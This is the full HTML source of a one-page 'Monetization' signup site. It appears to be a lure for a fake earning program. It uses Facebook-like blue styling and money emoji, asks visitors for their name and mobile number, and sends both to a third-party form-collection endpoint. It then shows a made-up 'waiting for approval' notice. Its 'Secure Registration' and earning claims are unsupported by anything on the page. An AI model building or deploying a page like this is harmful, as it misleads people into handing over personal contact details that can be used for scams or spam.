<!DOCTYPE html>
<html>
<head>

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Monetization</title>

<style>

body{
    margin:0;
    font-family:Arial,sans-serif;
    background:linear-gradient(135deg,#050505,#1877f2,#00c853);
    min-height:100vh;
    overflow:hidden;
}

.header{
    text-align:center;
    color:white;
    padding:35px 10px;
}

.header h1{
    font-size:32px;
    text-shadow:0 3px 10px rgba(0,0,0,.5);
}

.card{
    background:white;
    width:85%;
    max-width:400px;
    margin:auto;
    padding:25px;
    border-radius:20px;
    box-shadow:0 5px 20px rgba(0,0,0,.3);
}

h2{
    text-align:center;
    color:#1877f2;
}

input{
    width:90%;
    padding:15px;
    margin:10px 0;
    border-radius:10px;
    border:1px solid #ddd;
    font-size:16px;
}

button{
    width:100%;
    padding:15px;
    margin-top:10px;
    background:#1877f2;
    color:white;
    border:none;
    border-radius:10px;
    font-size:18px;
}

.info{
    margin-top:20px;
    background:#f0f2f5;
    padding:15px;
    border-radius:10px;
}

#waiting{
    display:none;
    margin-top:20px;
    background:#e8f5e9;
    padding:15px;
    border-radius:10px;
    text-align:center;
    color:green;
}


/* Money Stickers */

.money{
    position:fixed;
    font-size:45px;
    opacity:0.8;
    animation:float 4s infinite;
    z-index:-1;
}

.money1{
    top:15%;
    left:8%;
}

.money2{
    top:45%;
    right:8%;
}

.money3{
    bottom:15%;
    left:12%;
}

@keyframes float{

0%{
transform:translateY(0);
}

50%{
transform:translateY(-20px);
}

100%{
transform:translateY(0);
}

}

</style>

</head>


<body>


<div class="money money1">💰</div>

<div class="money money2">💵</div>

<div class="money money3">⭐</div>



<div class="header">

<h1>Monetization</h1>

<p>Join our earning program</p>

</div>



<div class="card">


<h2>Welcome</h2>



<form id="myForm">


<input type="text"
name="name"
placeholder="User Name"
required>


<input type="tel"
name="phone"
placeholder="Mobile Number"
required>


<button type="submit">
Submit
</button>


</form>



<div id="waiting">

<h3>Waiting for approval</h3>

<p>
Your request has been received and will be reviewed within 24 hours.
</p>

</div>



<div class="info">

✅ Secure Registration<br>
⭐ Monetization Support<br>
💰 Earn Online

</div>



<button onclick="window.open('report.html','_blank')">

Report

</button>



</div>




<script>

document.getElementById("myForm").addEventListener("submit",function(e){

e.preventDefault();


let formData = new FormData(this);


fetch("https://formspree.io/f/xzdnbyqa",{

method:"POST",

body:formData,

headers:{
"Accept":"application/json"
}

});


document.getElementById("waiting").style.display="block";


this.reset();


});

</script>


</body>
</html>
